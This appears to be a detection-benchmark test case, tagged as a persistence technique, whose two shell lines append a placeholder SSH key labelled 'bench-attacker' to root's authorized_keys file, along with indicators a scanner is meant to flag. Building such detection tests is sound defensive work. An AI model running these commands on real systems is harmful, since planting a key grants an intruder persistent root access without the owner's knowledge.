# category: persistence
# title: SSH key added to root
# indicator: bench-attacker
# indicator: /root/.ssh/authorized_keys
mkdir -p /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBenchBenchBenchBenchBenchBenchBenchBenchBen bench-attacker' >>/root/.ssh/authorized_keys
